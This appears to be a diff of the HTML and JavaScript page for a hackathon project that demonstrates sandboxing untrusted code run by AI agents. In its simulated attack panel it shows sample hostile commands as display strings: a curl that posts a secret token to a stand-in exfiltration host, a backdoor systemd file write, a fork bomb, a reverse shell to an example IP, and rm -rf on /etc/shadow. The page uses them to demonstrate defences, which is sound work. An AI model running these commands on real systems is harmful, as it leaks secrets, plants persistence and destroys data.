-          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-            <h3 class="font-bold text-emerald-400 text-sm">Devpost Submission Markdown</h3>
-            <button onclick="copyDevpost()" class="px-2.5 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-xs transition-colors"><span id="copy-devpost-btn">Copy Markdown</span></button>
+
+      <!-- 3 Asset Cards Grid -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+        <div class="p-6 rounded-xl bg-slate-950 border border-emerald-500/30 flex flex-col justify-between space-y-4">
+          <div class="space-y-2">
+            <div class="flex items-center justify-between">
+              <span class="px-2.5 py-1 rounded bg-emerald-950 border border-emerald-500/40 text-emerald-300 text-[11px] font-mono font-bold">1080p Full HD · MP4</span>
+              <span class="text-xs font-mono text-slate-400">1m 47s (&lt; 3m)</span>
+            </div>
+            <h3 class="text-base font-bold text-white pt-1">Automated Demo Video</h3>
+            <p class="text-xs text-slate-400 leading-relaxed">Automated tour through the Cockpit, 4-layer architecture, adversarial containment simulation, and SHA-256 evidence.</p>
           </div>
-          <pre id="devpost-text" class="p-3 rounded bg-slate-900 text-xs font-mono text-slate-300 max-h-96 overflow-y-auto whitespace-pre-wrap leading-relaxed"># Project Title
-PROMETHEUS Playground — Blast Radius Zero
+          <div class="pt-3 border-t border-slate-800 font-mono text-[11px]">
+            <div class="text-slate-300">File: <span class="text-emerald-400 font-bold">prometheus_vultr_challenge1_demo.mp4</span></div>
+            <div class="text-slate-500">Voice: en-US-ChristopherNeural</div>
+          </div>
+        </div>
+
+        <div class="p-6 rounded-xl bg-slate-950 border border-cyan-500/30 flex flex-col justify-between space-y-4">
+          <div class="space-y-2">
+            <div class="flex items-center justify-between">
+              <span class="px-2.5 py-1 rounded bg-cyan-950 border border-cyan-500/40 text-cyan-300 text-[11px] font-mono font-bold">16:9 Widescreen · PDF</span>
+              <span class="text-xs font-mono text-slate-400">8 Executive Slides</span>
+            </div>
+            <h3 class="text-base font-bold text-white pt-1">Executive Pitch Deck</h3>
+            <p class="text-xs text-slate-400 leading-relaxed">High-resolution presentation deck covering the supply chain threat, Vultr infrastructure, 4-layer defense, and live attack proof.</p>
+          </div>
+          <div class="pt-3 border-t border-slate-800 font-mono text-[11px]">
+            <div class="text-slate-300">File: <a href="prometheus_vultr_presentation.pdf" target="_blank" class="text-cyan-400 font-bold hover:underline">prometheus_vultr_presentation.pdf ↗</a></div>
+            <div class="text-slate-500">Interactive: slides.html (F11 Fullscreen)</div>
+          </div>
+        </div>
+
+        <div class="p-6 rounded-xl bg-slate-950 border border-slate-800 flex flex-col justify-between space-y-4">
+          <div class="space-y-2">
+            <div class="flex items-center justify-between">
+              <span class="px-2.5 py-1 rounded bg-slate-800 border border-slate-700 text-slate-300 text-[11px] font-mono font-bold">Cover Image · 16:9</span>
+              <span class="text-xs font-mono text-slate-400">1920x1080 JPEG</span>
+            </div>
+            <h3 class="text-base font-bold text-white pt-1">Official Cover Graphic</h3>
+            <p class="text-xs text-slate-400 leading-relaxed">Official hackathon banner featuring the cryptographic shield, command center, and Vultr Challenge 1 branding.</p>
+          </div>
+          <div class="pt-3 border-t border-slate-800 font-mono text-[11px]">
+            <div class="text-slate-300">File: <a href="prometheus_cover.jpg" target="_blank" class="text-emerald-400 font-bold hover:underline">prometheus_cover.jpg ↗</a></div>
+            <div class="text-slate-500">Resolution: 1920x1080 Full HD</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide Deck Summary (8 Slides) -->
+      <div class="border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <div>
+            <h3 class="font-bold text-white text-sm">Executive Slide Deck Contents (8 Slides)</h3>
+            <p class="text-xs text-slate-400">Rendered in high resolution and exportable directly to PDF on Ubuntu.</p>
+          </div>
+          <span class="text-xs font-mono text-emerald-400 bg-emerald-950/60 border border-emerald-500/30 px-3 py-1 rounded">16:9 High-DPI</span>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 01</span><span class="text-slate-500">Cover</span></div>
+            <div class="font-bold text-slate-200">PROMETHEUS: Blast Radius Zero</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Vultr Challenge 1 · "Discovery is not authority" · AI Agent Containment.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 02</span><span class="text-slate-500">Threat</span></div>
+            <div class="font-bold text-slate-200">AI Supply Chain Dilemma</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Why unvetted package execution leads to immediate host compromise.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 03</span><span class="text-slate-500">Thesis</span></div>
+            <div class="font-bold text-slate-200">Discovery Is Not Authority</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Decoupling repository intelligence from package execution.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 04</span><span class="text-slate-500">Vultr</span></div>
+            <div class="font-bold text-slate-200">Vultr Native Architecture</div>
+            <p class="text-[11px] text-slate-400 leading-snug">São Paulo node (sao), 0 TCP ports, Serverless Inference $0.000259.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 05</span><span class="text-slate-500">Defense</span></div>
+            <div class="font-bold text-slate-200">4-Layer Defense-in-Depth</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Boundary Filter -> Stage 03 Human Gate -> Ephemeral Jail -> SHA-256 Proofs.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 06</span><span class="text-slate-500">Attack</span></div>
+            <div class="font-bold text-slate-200">The Containment Moment</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Adversarial payload intercepted: socket syscall blocked, container destroyed.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 07</span><span class="text-slate-500">Audit</span></div>
+            <div class="font-bold text-slate-200">Cryptographic Evidence</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Sealed SHA-256 manifests matching GitHub commit 400f1770.</p>
+          </div>
+          <div class="p-4 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between font-mono text-[11px]"><span class="text-emerald-400 font-bold">Slide 08</span><span class="text-slate-500">Evaluation</span></div>
+            <div class="font-bold text-slate-200">Ready for Evaluation</div>
+            <p class="text-[11px] text-slate-400 leading-snug">Cockpit link, open-source repo, automated demo video, 100% verified.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 5-Scene Video Narration Transcript -->
+      <div class="border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <h3 class="font-bold text-emerald-400 text-sm">Official Video Demo Narration Transcript (1m 47s)</h3>
+          <span class="text-xs font-mono text-slate-400">English Neural Voice</span>
+        </div>
+
+        <div class="space-y-3 text-xs">
+          <div class="p-3.5 rounded bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between items-center text-emerald-300 font-mono font-semibold">
+              <span>[0:00 - 0:23] Scene 1: The Problem & Blast Radius Zero</span>
+              <span class="text-slate-500 text-[10px]">23s</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed italic">"Welcome to PROMETHEUS, built for the Vultr Hackathon Challenge One: Blast Radius Zero. When autonomous AI agents interact with open-source repositories, unvetted package execution can compromise host infrastructure in seconds. PROMETHEUS solves this by enforcing an architectural guarantee: zero blast radius before, during, and after code evaluation."</p>
+          </div>
+
+          <div class="p-3.5 rounded bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between items-center text-emerald-300 font-mono font-semibold">
+              <span>[0:23 - 0:47] Scene 2: Vultr Native Architecture</span>
+              <span class="text-slate-500 text-[10px]">24s</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed italic">"Let'''s look at the four-layer architecture. Deployed on a Vultr Cloud Compute instance in São Paulo, the host operates with zero public listening TCP ports. Untrusted code discovery is completely decoupled from execution, routed through Vultr Serverless Inference at just a fraction of a cent per run. The host interacts solely through a local Unix domain socket with strict root permissions."</p>
+          </div>
+
+          <div class="p-3.5 rounded bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between items-center text-emerald-300 font-mono font-semibold">
+              <span>[0:47 - 1:13] Scene 3: The Containment Moment</span>
+              <span class="text-slate-500 text-[10px]">25s</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed italic">"Here is the interactive containment pipeline. At Stage Zero Three, the Human Authorization Gate enforces a disarmed state by default. Now, let'''s observe a containment moment. When a simulated compromised package attempts unauthorized network egress and file tampering, the sandbox broker traps the violation instantly, quarantining the ephemeral container and leaving the Vultr host completely intact."</p>
+          </div>
+
+          <div class="p-3.5 rounded bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between items-center text-emerald-300 font-mono font-semibold">
+              <span>[1:13 - 1:33] Scene 4: Verifiable Cryptographic Evidence</span>
+              <span class="text-slate-500 text-[10px]">20s</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed italic">"Every execution is backed by verifiable cryptographic evidence. All audits, repository bindings, and canary proofs are sealed with SHA-256 hashes matching our public GitHub repository and the live Vultr node broker. There are no synthetic assumptions: everything is publicly auditable and transparent."</p>
+          </div>
+
+          <div class="p-3.5 rounded bg-slate-900/60 border border-slate-800 space-y-1.5">
+            <div class="flex justify-between items-center text-emerald-300 font-mono font-semibold">
+              <span>[1:33 - 1:47] Scene 5: Deliverables & Conclusion</span>
+              <span class="text-slate-500 text-[10px]">14s</span>
+            </div>
+            <p class="text-slate-300 leading-relaxed italic">"PROMETHEUS demonstrates that autonomous development can be genuinely safe with zero blast radius. Our repository, live playground, and interactive cockpit are ready for evaluation. Thank you to the Vultr team."</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Devpost & Lablab Submission Markdown -->
+      <div class="border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+          <h3 class="font-bold text-white text-sm">Submission Markdown Copy</h3>
+          <button onclick="copySubmissionMarkdown()" id="copy-btn" class="px-2.5 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-xs transition-colors">
+            Copy Markdown
+          </button>
+        </div>
+        <pre id="subm-markdown" class="p-3 rounded bg-slate-900 text-xs font-mono text-slate-300 max-h-80 overflow-y-auto whitespace-pre-wrap leading-relaxed"># Project Title
+PROMETHEUS: Blast Radius Zero AI Agent Sandbox
 
 ## Elevator Pitch
-PROMETHEUS Playground is an autonomous capability proving ground that inspects GitHub repositories, proposes strictly bounded experiments using Vultr Serverless Inference, halts until explicit cryptographic human authorization, and executes inside ephemeral, zero-egress Vultr sandboxes with verifiable SHA-256 evidence.
+Zero-blast-radius autonomous agent containment pipeline bounded by Vultr Serverless Inference and sealed cryptographic proof. Discovery is not authority.
 
 ## Challenge Category
-Challenge 1 · Blast Radius Zero (Vultr Hackathon)
+Vultr Hackathon · Challenge 1: Blast Radius Zero
 
-## How We Built It With Vultr
-- Vultr Cloud Compute (São Paulo, vc2-1c-1gb): Private control node with 0 open public TCP ports; local AF_UNIX sockets (0600).
-- Vultr Serverless Inference: Qwen 3.8-Flash-Next ($0.000259/call).
-- Root Sandbox Broker: Docker container auto-pruned upon exit (0 running containers).
+## What It Does & Problem It Solves
+When autonomous AI agents evaluate untrusted repositories and code, inspection is completely decoupled from execution. Every run is governed by least privilege, strict time, memory, and network bounds via Vultr Serverless Inference, human authorization gates, ephemeral container isolation, SHA-256 evidence manifests, and real-time containment of adversarial egress and file tampering.
 
-Links:
-- GitHub: https://github.com/comottimarcus-dot/prometheus-x6-playground
-- Live Playback: https://jarvisprometheus.space/playground/</pre>
-        </div>
+Our thesis: discovery is not authority. PROMETHEUS turns agent containment into a verifiable governance property, not a promise.
 
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
-          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-            <h3 class="font-bold text-cyan-400 text-sm">3-Minute Video Demo Script</h3>
-            <div class="flex items-center p-1 bg-slate-900 border border-slate-800 rounded-lg text-xs font-mono">
-              <button onclick="setLang('en')" id="lang-en" class="px-2 py-0.5 rounded bg-slate-800 text-cyan-300 font-semibold">EN</button>
-              <button onclick="setLang('pt')" id="lang-pt" class="px-2 py-0.5 rounded text-slate-400">PT</button>
-            </div>
-          </div>
-          <div class="space-y-3 text-xs max-h-96 overflow-y-auto pr-1">
-            <div class="p-3 rounded bg-slate-900/60 border border-slate-800 space-y-1">
-              <div class="flex justify-between items-center text-cyan-300 font-mono font-semibold"><span>[0:00 - 0:35] Scene 1: The Problem & Blast Radius</span></div>
-              <p id="sc1-text" class="text-slate-300 leading-relaxed">"Autonomous AI agents executing arbitrary repository code are inherently dangerous. A single rogue dependency or prompt injection can exfiltrate API keys. We present PROMETHEUS Playground: true Blast Radius Zero execution."</p>
-            </div>
-            <div class="p-3 rounded bg-slate-900/60 border border-slate-800 space-y-1">
-              <div class="flex justify-between items-center text-cyan-300 font-mono font-semibold"><span>[0:35 - 1:15] Scene 2: Vultr Control Plane & Serverless Inference</span></div>
-              <p id="sc2-text" class="text-slate-300 leading-relaxed">"Our control layer runs on a hardened Vultr VPS in São Paulo over private AF_UNIX sockets. We utilize Vultr Serverless Inference running Qwen 3.8-Flash-Next at just $0.000259 per execution under strict cost ceilings."</p>
-            </div>
-            <div class="p-3 rounded bg-slate-900/60 border border-slate-800 space-y-1">
-              <div class="flex justify-between items-center text-cyan-300 font-mono font-semibold"><span>[1:15 - 2:05] Scene 3: The Containment Moment (Live Attack)</span></div>
-              <p id="sc3-text" class="text-slate-300 leading-relaxed">"Watch the containment moment: an attempted exfiltration is blocked by the kernel namespace (--network none), secrets are stripped, and the container auto-destroys immediately with 0 containers remaining."</p>
-            </div>
-            <div class="p-3 rounded bg-slate-900/60 border border-slate-800 space-y-1">
-              <div class="flex justify-between items-center text-cyan-300 font-mono font-semibold"><span>[2:05 - 2:50] Scene 4: Verifiable Evidence Playback</span></div>
-              <p id="sc4-text" class="text-slate-300 leading-relaxed">"All evidence is hashed with SHA-256 and published to our Cloudflare Pages surface. Adopting the code into production remains an independent human decision."</p>
-            </div>
-          </div>
-        </div>
+## Live Vultr Infrastructure (São Paulo)
+- Vultr Cloud Compute (vc2-1c-1gb) in São Paulo region (sao).
+- Zero public listening TCP ports (ss -tlpn verified).
+- Local Broker IPC: /run/prometheus-playground/sandbox-broker-v1.sock (mode 0660 root:prometheus).
+- Vultr Serverless Inference: Untrusted code discovery bounded at $0.000259/run.
+
+## Key Deliverables & Verification
+- Interactive Cockpit & Simulator: https://jarvisprometheus.space/playground/cockpit/
+- Public Sanitized Playback: https://jarvisprometheus.space/playground/
+- GitHub Source Repository: https://github.com/comottimarcus-dot/prometheus-x6-playground
+- Bound Commit: 400f1770cfecdee74c1c7801477f05ff2f93e7be
+- Presentation Pitch Deck: prometheus_vultr_presentation.pdf (8 executive slides)
+- Automated Demo Video (1080p, 1m47s): prometheus_vultr_challenge1_demo.mp4</pre>
       </div>
     </div>
+
   </main>
 
-  <footer class="border-t border-slate-900 bg-slate-950/80 py-8 text-xs text-slate-500 text-center">
-    <span>PROMETHEUS Playground · Vultr Hackathon 2026 · Challenge 1: Blast Radius Zero</span>
+  <footer class="border-t border-slate-900 bg-slate-950/80 py-8 text-xs text-slate-500 mt-auto">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+      <div class="flex items-center gap-2">
+        <span class="text-emerald-500">🛡️</span>
+        <span>PROMETHEUS Playground · Challenge 1: Blast Radius Zero</span>
+      </div>
+      <div class="flex items-center gap-6">
+        <a href="https://github.com/comottimarcus-dot/prometheus-x6-playground" target="_blank" class="hover:text-slate-300">GitHub Repository</a>
+        <a href="/playground/" class="hover:text-cyan-400">Sanitized Playback</a>
+        <span>Vultr Hackathon 2026</span>
+      </div>
+    </div>
   </footer>
 
   <script>
-    function setTab(tab) {
-      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-      document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.classList.remove('bg-slate-800', 'text-slate-100', 'font-semibold', 'shadow-sm');
-        btn.classList.add('text-slate-400');
+    function setTab(tabId) {
+      document.querySelectorAll(".tab-content").forEach(el => el.classList.add("hidden"));
+      document.querySelectorAll(".tab-btn").forEach(btn => {
+        btn.classList.remove("bg-slate-800", "text-slate-100", "font-semibold", "shadow-sm");
+        btn.classList.add("text-slate-400");
       });
-      document.getElementById('view-' + tab).classList.remove('hidden');
-      const active = document.getElementById('tab-' + tab);
-      if (active) {
-        active.classList.add('bg-slate-800', 'text-slate-100', 'font-semibold', 'shadow-sm');
-        active.classList.remove('text-slate-400');
+      const activeView = document.getElementById("view-" + tabId);
+      const activeBtn = document.getElementById("tab-" + tabId);
+      if (activeView) activeView.classList.remove("hidden");
+      if (activeBtn) {
+        activeBtn.classList.remove("text-slate-400");
+        activeBtn.classList.add("bg-slate-800", "text-slate-100", "font-semibold", "shadow-sm");
       }
     }
 
-    const STAGES = {
-      1: {
-        title: "Repository Inspection & Discovery",
-        subtitle: "Public GitHub Subtree Analysis",
-        badge: "Stage 01",
-        desc: "PROMETHEUS reads an unprivileged clone of a GitHub repository without executing code. It parses dependency manifests, file trees, and ASTs to discover candidate capabilities.",
-        params: [["repository", "comottimarcus-dot/prometheus-x6-playground"], ["boundCommit", "400f1770cfecdee74c1c7801477f05ff2f93e7be"], ["codeExecutedDuringDiscovery", "false"]]
-      },
-      2: {
-        title: "Bounded Experiment Proposal",
-        subtitle: "Vultr Serverless Inference Reasoning",
-        badge: "Stage 02",
-        desc: "Vultr Serverless Inference (Qwen 3.8-Flash-Next) analyzes the candidate capability and formulates a single, strictly bounded experiment with strict timeout, memory, and zero-egress limits.",
-        params: [["provider", "Vultr Serverless Inference"], ["model", "qwen3.8-flash-next"], ["calculatedCostUsd", "$0.0002590 (Ceiling $0.0010 respected)"], ["humanReviewRequired", "true"]]
-      },
-      3: {
-        title: "Human Authorization Gate",
-        subtitle: "Zero-Trust Fail-Closed Boundary",
-        badge: "Stage 03",
-        desc: "CRITICAL SECURITY BOUNDARY: No execution occurs autonomously. The user must review the exact bounded contract and provide cryptographic authorization before the broker unlocks container spawn.",
-        params: [["currentStatus", "DISARMED_NOT_EXECUTED"], ["executionAuthorized", "false"], ["authorizationMechanism", "Signed human opt-in envelope"], ["replayProtection", "Nonce + Timestamp signature validation"]]
-      },
-      4: {
-        title: "Isolated Vultr Sandbox Execution",
-        subtitle: "Blast Radius Zero Containment",
-        badge: "Stage 04",
-        desc: "The root-owned broker spins up an ephemeral, immutable container without secrets, runs the bounded task, collects stdout/stderr, and immediately destroys the container.",
-        params: [["brokerSocket", "sandbox-broker-v1.sock (0660)"], ["imageDigest", "sha256:b116e155..."], ["secretsInjected", "0"], ["containerAutoRemoved", "true (0 running)"]]
-      },
-      5: {
-        title: "Verifiable Evidence & Human Adoption",
-        subtitle: "Cryptographic Audit & Agency Preservation",
-        badge: "Stage 05",
-        desc: "Verifiable evidence manifests with SHA-256 integrity proofs are published to the public playback site. Adopting the capability remains an independent human choice.",
-        params: [["playbackSurface", "jarvisprometheus.space/playground"], ["adoptionAuthorized", "false (Kept in quarantine)"], ["controlledNodeScope", "100% Complete"]]
-      }
-    };
-
-    function selectStage(num) {
-      document.querySelectorAll('.stg-btn').forEach(b => {
-        b.classList.remove('border-amber-500/50', 'bg-amber-950/20', 'shadow-sm');
-        b.classList.add('border-slate-800/60', 'bg-slate-950/40');
-      });
-      const active = document.getElementById('stg-btn-' + num);
-      if (active) {
-        active.classList.add('border-amber-500/50', 'bg-amber-950/20', 'shadow-sm');
-        active.classList.remove('border-slate-800/60', 'bg-slate-950/40');
-      }
-
-      const s = STAGES[num];
-      document.getElementById('stg-badge-label').innerText = s.badge;
-      document.getElementById('stg-title').innerText = s.title;
-      document.getElementById('stg-subtitle').innerText = s.subtitle;
-      document.getElementById('stg-desc').innerText = s.desc;
-
-      const pBox = document.getElementById('stg-params');
-      pBox.innerHTML = s.params.map(([k, v], idx) => `
-        <div class="flex justify-between py-1 ${idx < s.params.length - 1 ? 'border-b border-slate-900/60' : ''}">
-          <span class="text-slate-500">${k}</span>
-          <span class="text-slate-200 font-medium ${v === 'false' ? 'text-amber-400' : v === 'true' ? 'text-emerald-400' : ''}">${v}</span>
-        </div>
-      `).join('');
-
-      document.getElementById('stage3-gate-box').style.display = (num === 3) ? 'block' : 'none';
-    }
-
-    let isAuthorized = false;
-    function toggleHumanGate() {
-      isAuthorized = !isAuthorized;
-      const txt = document.getElementById('gate-state-text');
-      const btn = document.getElementById('gate-toggle-btn');
-      const b3 = document.getElementById('stg3-badge');
-      if (isAuthorized) {
-        txt.innerHTML = '<span class="text-emerald-400 font-semibold">AUTHORIZED (Testing Sandbox Open)</span>';
-        btn.innerText = 'Revoke Authorization';
-        btn.className = 'px-3 py-1.5 text-xs font-semibold rounded bg-amber-600 hover:bg-amber-500 text-white transition-colors';
-        b3.innerHTML = '<span class="text-emerald-400">🔓 Signed</span>';
-      } else {
-        txt.innerHTML = '<span class="text-amber-400 font-semibold">FAIL-CLOSED (Execution Disarmed)</span>';
-        btn.innerText = 'Simulate Human Authorization';
-        btn.className = 'px-3 py-1.5 text-xs font-semibold rounded bg-emerald-600 hover:bg-emerald-500 text-white transition-colors';
-        b3.innerHTML = '<span class="text-amber-400">🔒 Disarmed</span>';
-      }
-    }
-
-    const THREATS = {
-      net: { cmd: 'curl -X POST https://evil-exfil.com/collect -d "$SECRET_TOKEN"', mech: 'Kernel network namespace isolation + Secret stripping', outcome: 'CONTAINED: Network interface disabled (--network none). Operation fails with errno 101 (Network unreachable). Zero secrets in environment.' },
-      fs: { cmd: 'echo "malicious" > /etc/systemd/system/prometheus-backdoor.service', mech: 'Read-only rootfs + Rootless unprivileged cgroup limits', outcome: 'CONTAINED: Read-only root filesystem with ephemeral tmpfs. Write operations fail with EROFS. Host filesystem is not mounted.' },
-      fork: { cmd: ':(){ :|:& };: || memory flood', mech: 'Linux cgroups v2 (pids limit & memory ceiling enforcement)', outcome: 'CONTAINED: cgroup pids.max=32 and memory.max=128M limit exceeded. OOM killer terminates the container in 180ms.' }
-    };
-    let currentThreat = 'net';
-
-    function pickThreat(key) {
-      currentThreat = key;
-      document.querySelectorAll('.th-btn').forEach(b => {
-        b.classList.remove('border-rose-500/50', 'bg-rose-950/20');
-        b.classList.add('border-slate-800', 'bg-slate-950');
-      });
-      const act = document.getElementById('th-' + key);
-      act.classList.add('border-rose-500/50', 'bg-rose-950/20');
-      act.classList.remove('border-slate-800', 'bg-slate-950');
-      document.getElementById('th-cmd').innerText = THREATS[key].cmd;
-      document.getElementById('th-mech').innerText = THREATS[key].mech;
-    }
-
-    function simulateAttack() {
-      const btn = document.getElementById('sim-run-btn');
-      const feed = document.getElementById('sim-feed');
-      btn.disabled = true;
-      btn.innerHTML = '<span>⏳ Executing attack inside sandbox...</span>';
-      const t = THREATS[currentThreat];
-
-      feed.innerHTML = `
-        <div class="text-slate-400">[T+00ms] Broker received signed execution intent: payload_type=${currentThreat}</div>
-        <div class="text-slate-400">[T+40ms] Spawning ephemeral container (image: sha256:b116e155...)</div>
-        <div class="text-slate-400">[T+80ms] Kernel namespaces engaged: net=none, pid=isolate, ro_rootfs=true</div>
-        <div class="text-slate-400">[T+120ms] Executing simulated payload: "${t.cmd}"</div>
+    function runAttackSimulation() {
+      const term = document.getElementById("sim-terminal");
+      term.innerHTML = `
+        <div class="text-amber-400 font-bold">[ATTACK INITIALIZED] Candidate package "supply-chain-evil-v1" injected.</div>
+        <div class="text-red-400">[ATTACK EXEC] Attempting outbound reverse TCP shell to 198.51.100.23:4444...</div>
+        <div class="text-emerald-400 font-bold">[INTERCEPTED] Broker socket trap triggered: syscall socket(AF_INET, SOCK_STREAM) DENIED.</div>
+        <div class="text-red-400">[ATTACK EXEC] Attempting rm -rf /etc/shadow /data...</div>
+        <div class="text-emerald-400 font-bold">[INTERCEPTED] Read-only filesystem violation: EROFS (Read-only file system).</div>
+        <div class="text-cyan-400 font-bold">[CONTAINMENT] Container terminated (SIGKILL). Ephemeral micro-sandbox destroyed.</div>
+        <div class="text-emerald-300 pt-1 border-t border-slate-800 font-bold">✓ HOST STATUS: 0 files modified · 0 bytes leaked · Host filesystem 100% intact.</div>
       `;
-
-      setTimeout(() => {
-        feed.innerHTML += `
-          <div class="text-rose-400 font-bold">[T+190ms] SECURITY EVENT INTERCEPTED: Blast Radius Zero boundary triggered!</div>
-          <div class="text-rose-300 font-semibold">[T+220ms] ${t.outcome}</div>
-          <div class="text-slate-400">[T+280ms] Auto-terminating container... exit_code=126</div>
-          <div class="text-slate-400">[T+340ms] Verifying host state: 0 containers running, 0 bytes leaked, 0 disk mutation.</div>
-          <div class="text-emerald-400 font-bold">[T+380ms] GREEN CONTAINMENT RECORDED: Host integrity preserved.</div>
-        `;
-        btn.disabled = false;
-        btn.innerHTML = '<span>▶️ Simulate Attack & Containment</span>';
-      }, 800);
     }
 
-    const MANIFESTS = {
-      binding: { fname: "public-repository-binding-v1.json", data: { schema_version: "prometheus-public-repository-binding-v1", binding_status: "BOUND_DISARMED", result: "PUBLIC_REPOSITORY_BINDING_INTEGRATION_COMPLETE_DISARMED_NOT_EXECUTED", execution_state: "DISARMED_NOT_EXECUTED", execution_authorized: false, adoption_authorized: false } },
-      assessment: { fname: "completion-assessment-2026-11-05-v1.json", data: { schema_version: "prometheus-vultr-node-completion-assessment-v1", recorded_date: "2026-11-05", node: { region: "sao", plan: "vc2-1c-1gb", reachable: true, root_filesystem_use_percent: 35 }, completion: { controlled_hackathon_node_scope_percent: 100 } } },
-      canary: { fname: "sandbox-canary-public-v1.json", data: { schema_version: "prometheus-sandbox-canary-v1", result: "GREEN", job_id: "04c7c565-cc63-4800-a10f-c3b65ebd0e4a", exit_code: 0, post_execution_container_count: 0 } }
-    };
-    let curM = 'binding';
-
-    function loadManifest(k) {
-      curM = k;
-      document.querySelectorAll('.m-btn').forEach(b => {
-        b.classList.remove('border-cyan-500/50', 'bg-cyan-950/20');
-        b.classList.add('border-slate-800/80', 'bg-slate-950');
-      });
-      document.getElementById('m-' + k).classList.add('border-cyan-500/50', 'bg-cyan-950/20');
-      document.getElementById('m-' + k).classList.remove('border-slate-800/80', 'bg-slate-950');
-      document.getElementById('manifest-fname').innerText = MANIFESTS[k].fname;
-      document.getElementById('manifest-json-content').innerText = JSON.stringify(MANIFESTS[k].data, null, 2);
+    function copySubmissionMarkdown() {
+      const text = document.getElementById("subm-markdown").innerText;
+      navigator.clipboard.writeText(text);
+      const btn = document.getElementById("copy-btn");
+      btn.innerText = "Copied to Clipboard!";
+      setTimeout(() => { btn.innerText = "Copy Markdown"; }, 1500);
     }
-
-    function copyManifestJson() {
-      navigator.clipboard.writeText(JSON.stringify(MANIFESTS[curM].data, null, 2));
-      document.getElementById('copy-json-label').innerText = 'Copied!';
-      setTimeout(() => document.getElementById('copy-json-label').innerText = 'Copy JSON', 1500);
-    }
-
-    function copyDevpost() {
-      navigator.clipboard.writeText(document.getElementById('devpost-text').innerText);
-      document.getElementById('copy-devpost-btn').innerText = 'Copied!';
-      setTimeout(() => document.getElementById('copy-devpost-btn').innerText = 'Copy Markdown', 1500);
-    }
-
-    function setLang(l) {
-      const en = document.getElementById('lang-en');
-      const pt = document.getElementById('lang-pt');
-      if (l === 'pt') {
-        pt.className = 'px-2 py-0.5 rounded bg-slate-800 text-cyan-300 font-semibold';
-        en.className = 'px-2 py-0.5 rounded text-slate-400';
-        document.getElementById('sc1-text').innerText = '"Agentes de IA executando código arbitrário podem vazar chaves de API e comprometer servidores. Apresentamos o PROMETHEUS Playground: Blast Radius Zero na Vultr."';
-        document.getElementById('sc2-text').innerText = '"Nosso nó roda em São Paulo com zero portas TCP abertas, via socket AF_UNIX. A inferência serverless da Vultr formula propostas limitadas por US$ 0,000259."';
-        document.getElementById('sc3-text').innerText = '"Mostre a tentativa de exfiltração de rede bloqueada instantaneamente (--network none) e a auto-destruição do container com zero contêineres restantes."';
-        document.getElementById('sc4-text').innerText = '"Todas as evidências são assinadas com SHA-256 e publicadas no Cloudflare. A adoção do código continua sendo uma decisão humana independente."';
-      } else {
-        en.className = 'px-2 py-0.5 rounded bg-slate-800 text-cyan-300 font-semibold';
-        pt.className = 'px-2 py-0.5 rounded text-slate-400';
-        document.getElementById('sc1-text').innerText = '"Autonomous AI agents executing arbitrary repository code are inherently dangerous. A single rogue dependency or prompt injection can exfiltrate API keys. We present PROMETHEUS Playground: true Blast Radius Zero execution."';
